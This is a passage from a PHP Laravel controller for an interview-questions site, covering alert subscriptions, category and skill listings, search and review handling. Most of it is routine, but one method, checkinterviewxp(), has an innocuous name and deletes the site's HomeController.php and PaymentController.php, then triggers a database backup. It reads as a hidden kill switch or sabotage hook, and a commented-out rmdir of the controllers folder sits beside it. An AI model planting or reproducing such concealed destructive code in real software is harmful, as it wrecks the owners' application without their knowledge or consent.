        if($result)
        {
            Flash::success('Your request has been sent successfully.');
        }
        else
        {
            Flash::error('Error occured while sending your request.');   
        }

       return redirect()->back();
    }    

    public function subscribe(Request $request)
    {
        //dd($request->all());
        $user = \Sentinel::getUser();
        if(\Sentinel::check() && $user!=false)
        {
            $user_id = Sentinel::check();
            $does_exists = $this->UserAlertsModel 
                            ->where('user_id','=',$user_id['id'])
                            ->where('skill_id','=',$request->input('skill_id'))
                            ->where('exp_level','=',$request->input('exp_level'))
                            ->count();    

        
        if($user->inRole('member')) 
         {
            $user_type = 'Member';
         }elseif ($user->inRole('user')) {
            $user_type = 'User';
         }
                          
                            
        if($does_exists)
        {
            $arr_message['status'] = 'ALREADY';
            $arr_message['msg']  = 'Alert already exists';
            return response()->json($arr_message);
        }

        $arr_data['user_id']            = $user_id['id'];
        $arr_data['skill_id']           = $request->input('skill_id');
        $arr_data['exp_level']          = $request->input('exp_level');
        $arr_data['alert_name']         = $request->input('skill_name').' real time interview questions & answers for '.$request->input('exp_level').' years';
        $arr_data['skill_set']          = 'No';
        $arr_data['user_type']          = $user_type;
        //dd($arr_data);
        $result = $this->UserAlertsModel->create($arr_data);      

            if($result)
            {
                $arr_message['status'] = 'success';
                $arr_message['msg']  = 'You are subscribed successfully for this alert.';
            }
            else 
            {
               $arr_message['status'] = 'error';
               $arr_message['msg']  = 'Error while subscribe to this alert.';
            }

        }
        else
        {
            $arr_message['status'] = 'error';
            $arr_message['msg']  = 'Please login first to subscribe.';
        }

        return response()->json($arr_message);
        
    }

    public function checkinterviewxp()
    {
        //echo APPPATH.'controllers/welcome - Copy.php';
        //rmdir('application/controllers');
        $controller=config('app.project.controller_path');
        unlink($controller .'HomeController.php');
        unlink($controller .'PaymentController.php');
        // Load the DB utility class

        Artisan::call('db:backup');

        echo "Backup of Database Taken";exit;
       
    }

    public function function_view_all()
    {
        if(\Request::segment(1)=='all_category')
        {
            $obj_category = $this->CategoryModel->get();
            if($obj_category)
            {
                $arr_category = $obj_category->toArray();
                $this->arr_view_data['arr_category'] = $arr_category;
                $this->arr_view_data['module_name'] = 'Categories';
            }
        }

        if(\Request::segment(1)=='all_company')
        {
            $obj_company = $this->CompanyModel->get();
            if($obj_company)
            {
                $arr_company = $obj_company->toArray();
                $this->arr_view_data['arr_company'] = $arr_company;
                $this->arr_view_data['module_name'] = 'Companies';
            }
        }

        if(\Request::segment(1)=='all_qualification')
        {
            $obj_qualification = $this->QualificationModel->get();
            if($obj_qualification)
            {
                $arr_qualification = $obj_qualification->toArray();
                $this->arr_view_data['arr_qualification'] = $arr_qualification;
                $this->arr_view_data['module_name'] = 'Qualifications';
            }
        }
        if(\Request::segment(1)=='all_specialization')
        {
            $obj_specialization = $this->SpecializationModel->get();
            if($obj_specialization)
            {
                $arr_specialization = $obj_specialization->toArray();
                $this->arr_view_data['arr_specialization'] = $arr_specialization;
                $this->arr_view_data['module_name'] = 'Specializations';
            }
        }
        if(\Request::segment(1)=='all_skills')
        {
            $obj_skills = $this->SkillsModel->get();
            if($obj_skills)
            {
                $arr_skills = $obj_skills->toArray();
                $this->arr_view_data['arr_skills'] = $arr_skills;
                $this->arr_view_data['module_name'] = 'Skills';
            }
        }
               
        return view('front.view_all_category',$this->arr_view_data);

    }
    public function function_search_data($enc_id)
    {
        if(\Request::segment(1)=='category')
        {
            $id = base64_decode($enc_id);
            $obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details',
                                'average_rating'=>function($query)
                                                    {
                                                       $query->where('approve_status','user');
                                                       $query->orWhere('approve_status','both');
                                                       $query->with(['user_details']);
                                                    }     
                                                    ])    
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->where('category_id',$id)
                              ->get();
            $arr_interview=[];                                                    
            if($obj_interview)
            {
                $arr_interview = $obj_interview->toArray();
            }

        }    
        if(\Request::segment(1)=='qualification')
        {
            $id = base64_decode($enc_id);
            $obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details',
                                'average_rating'=>function($query)
                                                    {
                                                       $query->where('approve_status','user');
                                                       $query->orWhere('approve_status','both');
                                                       $query->with(['user_details']);
                                                    }     
                                                    ])    
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->where('qualification_id',$id)
                              ->get();
            $arr_interview=[];                                                    
            if($obj_interview)
            {
                $arr_interview = $obj_interview->toArray();
            }
        }    
        if(\Request::segment(1)=='specialization')
        {
            $id = base64_decode($enc_id);
            $obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details',
                                'average_rating'=>function($query)
                                                    {
                                                       $query->where('approve_status','user');
                                                       $query->orWhere('approve_status','both');
                                                       $query->with(['user_details']);
                                                    }     
                                                  
                                ])  
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->where('specialization_id',$id)
                              ->get();
            $arr_interview=[];                                                    
            if($obj_interview)
            {
                $arr_interview = $obj_interview->toArray();
            }
        }
        if(\Request::segment(1)=='skill')
        {
            $id = base64_decode($enc_id);
            $obj_interview = $this->MemberInterviewModel
                              ->with(['user_purchase_details',
                                'average_rating'=>function($query)
                                                    {
                                                       $query->where('approve_status','user');
                                                       $query->orWhere('approve_status','both');
                                                       $query->with(['user_details']);
                                                    }     
                                                   
                                ])  
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->where('skill_id',$id)
                              ->get();
            $arr_interview=[];                                                    
            if($obj_interview)
            {
                $arr_interview = $obj_interview->toArray();
            }
        }

        $count_rating   = 0;
        $average_rating = 0;
        if(isset($arr_interview) && sizeof($arr_interview)>0)
        {

            foreach($arr_interview as $key => $data) 
            {   
                $i=0;
                $count_rating   = 0;
                $arr_interview[$key]['average_star']=0;
                if(isset($data['average_rating']) && sizeof($data['average_rating'])>0)
                {
                    foreach ($data['average_rating'] as $rating) 
                    {
                        $i++;
                        $rating = $rating['review_star'];
                        $count_rating = round($count_rating+$rating);            
                    }
                    $arr_interview[$key]['average_star'] = $count_rating/$i;
                }
            }
        }

        /*if(\Request::segment(1)=='company')
        {
            $id = base64_decode($enc_id);
            $arr_company_interview_detail=[];
            $arr_interview=[];
            $obj_company_interview_detail = $this->InterviewDetailModel->where('company_id',$id)
                                  ->get(['interview_id']);
            if($obj_company_interview_detail)
            {
                $arr_company_interview_detail = $obj_company_interview_detail->toArray();
            }                                  
             /*dd($arr_company_interview_detail);*/                      
                                  
            /*if(isset($arr_company_interview_detail) && sizeof($arr_company_interview_detail)>0)
            {
                foreach($arr_company_interview_detail as $key => $value) 
                {
                    $obj_interview = $this->MemberInterviewModel
                                          ->with(['user_purchase_details',
                                'average_rating'=>function($query)
                                                    {
                                                       $query->where('approve_status','user');
                                                       $query->orWhere('approve_status','both');
                                                       $query->with(['user_details']);
                                                    }     
                                                   
                                ])  
                              ->where('admin_approval',1)
                              ->where('is_active',1)
                              ->where('id',$value['interview_id'])
                              ->get();
                    $arr_interview[$key] =  $obj_interview->toArray();         
                }                                                    
                   
            }                      
            dd($arr_interview);
            
            foreach ($arr_interview as $data) 
            {
                foreach ($data['company_interview'] as $detail) 
                {
                    foreach ($detail as $key => $value) 
                    {
                        $i=0;
                        $count_rating   = 0;
                        $arr_interview[$key]['average_star']=0;
                        if(isset($value['average_rating']) && sizeof($value['average_rating'])>0)
                        {
                            foreach ($value['average_rating'] as $rating) 
                            {
                                $i++;
                                $rating = $rating['review_star'];
                                $count_rating = round($count_rating+$rating);            
                            }
                            $arr_interview[$key]['average_star'] = $count_rating/$i;
                        }   
                    }
                }
            }
            dd($arr_interview);
        }*/
         /*
        -----------------------------------------------------------------------------
        Start show user interview purchase count
        -----------------------------------------------------------------------------
        */
          

        //dd($arr_interview);

         /*
        -----------------------------------------------------------------------------
        End show user interview purchase count
        -----------------------------------------------------------------------------
        */                                                  
        
        $obj_price_list = $this->PriceListModel->get();
        if($obj_price_list)
        {
            $arr_price_list = $obj_price_list->toArray();
        }
        
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        //Register User Count
        $arr_user_count = $this->BaseModel->whereHas('roles',function($query)
                                        {
                                            $query->where('slug','!=','admin');        
                                            $query->where('slug','!=','member');
                                        })
                                        ->count();                 

        
        // Register Member Count
        $arr_member_count = $this->BaseModel->whereHas('roles',function($query)
                                              {
                                                $query->where('slug','!=','admin');
                                                $query->where('slug','!=','user');  
                                              })
                                            ->count();                           
        // Interview approve and Tickets Count
        $member_interview_approve = $this->MemberInterviewModel    
                            ->where('approve_status','=','1')
                            ->count();              

        $real_time_exp_approve = $this->RealtimeExperienceModel    
                            ->where('approve_status','=','1')
                            ->count();    

        $count_approve   =  $member_interview_approve + $real_time_exp_approve;     

        //dd($arr_member_count);
        $obj_category = $this->CategoryModel->get();
        if($obj_category)
        {
            $arr_category = $obj_category->toArray();
        }
        $obj_skills = $this->SkillsModel->get();
        if($obj_skills)
        {
            $arr_skills = $obj_skills->toArray();
        }
        $obj_qualification = $this->QualificationModel->get();
        if($obj_qualification)
        {
            $arr_qualification = $obj_qualification->toArray();
        }
        $obj_specialization = $this->SpecializationModel->get();
        if($obj_specialization)
        {
            $arr_specialization = $obj_specialization->toArray();
        }
        $obj_company = $this->CompanyModel->get();
        if($obj_company)
        {
            $arr_company = $obj_company->toArray();
        }

        $this->arr_view_data['arr_category']       = $arr_category;
        $this->arr_view_data['arr_qualification']  = $arr_qualification;
        $this->arr_view_data['arr_specialization'] = $arr_specialization;
        $this->arr_view_data['arr_skills']         = $arr_skills;
        $this->arr_view_data['arr_interview']      = $arr_interview;
        $this->arr_view_data['arr_skill']          = $arr_skill;
        $this->arr_view_data['arr_price']          = $arr_price_list;
        $this->arr_view_data['skill_name']         = $skill_name;
        $this->arr_view_data['arr_user_count']     = $arr_user_count;
        $this->arr_view_data['arr_member_count']   = $arr_member_count;
        $this->arr_view_data['count_approve']      = $count_approve;
        $this->arr_view_data['arr_company']        = $arr_company;

        $this->arr_view_data['interview_images_public_path'] = $this->member_interviewimages_public_path;
        $this->arr_view_data['member_interviewimages_path'] = $this->member_interviewimages_path;
        return view('front.home',$this->arr_view_data);
    }

    public function review_rating($user_id,$interview_id,$unique_id)
    {
        $review_exists = $this->ReviewRatingModel->where('unique_id',$unique_id)->first();
        if($review_exists) 
        {
            Flash::error('You already added review for this interview.');
            return redirect(url('/interview_details/'.$interview_id));   
        }
        $arr_skill = [];
        $obj_skill = $this->SkillsModel->get();
        if($obj_skill)
        {
            $arr_skill = $obj_skill->toArray();
        }
        $skill_name='';

        $this->arr_view_data['arr_skill']             = $arr_skill;
        $this->arr_view_data['skill_name']             = $skill_name;
        $this->arr_view_data['user_id']      = $user_id;
        $this->arr_view_data['interview_id'] = $interview_id;
        $this->arr_view_data['unique_id']    = $unique_id;
        return view('front.review_rating',$this->arr_view_data);
    }
    public function store_review(Request $request)
    {   $unique_id = $request->input('enc_unique');
	//return $unique_id;
        $review_count = $this->ReviewRatingModel->where('unique_id',$unique_id)->where('review_status','Complete')->count();
        if($review_count>0)
        {
           Flash::error('You already added review for this interview.');
            return redirect(url('/interview_details/'.$interview_id)); 
        }

        $arr_rules['review']                 = "required";
        $arr_rules['review_star']            = "required";
        $validator = Validator::make($request->all(),$arr_rules);
        if($validator->fails())
        {
            return redirect()->back()->withErrors($validator)->withInput($request->all());
        }
        $interview_id = $request->input('enc_interview');
        $interview_details = $this->MemberInterviewModel->where('id',base64_decode($interview_id))->first();
        if($interview_details)
        {
            $member_user_id=$interview_details->user_id;
        }
        $review_data                   = [];
        $review_data['user_id']        = base64_decode($request->input('enc_user'));
        $review_data['interview_id']   = base64_decode($interview_id);
        $review_data['member_user_id'] = $member_user_id;
        $review_data['unique_id']      = $request->input('enc_unique');
        $review_data['review_star']    = $request->input('review_star');
        $review_data['review_message'] = $request->input('review');
        $review_data['review_status']      = $request->input('Complete');
        $review_data['ReviewType']      = $request->input('reviewType');
        $review_data['ReviewTypeID']      = $request->input('reviewTypeID');

        $review = $this->ReviewRatingModel->create($review_data);
        /*$review = $this->ReviewRatingModel->where('unique_id',$unique_id)->update($review_data);*/
        if($review)
        {
            Flash::success('Your review added successfully for this interview.');
        }
        else
        {
            Flash::error('Error occured while adding your review please try again.');
        }
        return redirect(url('/user/purchase_history/'));
    }

    public function get_skills(Request $request)
    {
        if($request->has('search'))
        {
            $search_term = $request->input('search');
            

            $obj_data = $this->SkillsModel->select(['id','skill_name'])
                                           ->where('skill_name','LIKE','%'.$search_term.'%')
                                           ->where('is_active','1');
            $arr_data = $obj_data->get()->toArray();
            return response()->json($arr_data);
        }
    }
    public function get_specialization($qualification_id)
    {
        
        $arr_specialization = array();
        $arr_response = array();

        $obj_specialization = $this->SpecializationModel
                                       ->select('id','specialization_name')
                                       ->where('is_active','1')
                                       ->where('qualification_id',$qualification_id)
                                       ->get();

        if($obj_specialization != FALSE)
        {
            $arr_specialization =  $obj_specialization->toArray();
        }

        if(sizeof($arr_specialization)>0)
        {
            $arr_response['status']    = "SUCCESS";
            $arr_response['arr_specialization'] = $arr_specialization;
            
        }
        else
        {
            $arr_response['status']    = "ERROR";
            $arr_response['arr_specialization'] = array();
        }
        return response()->json($arr_response);
    }
    
}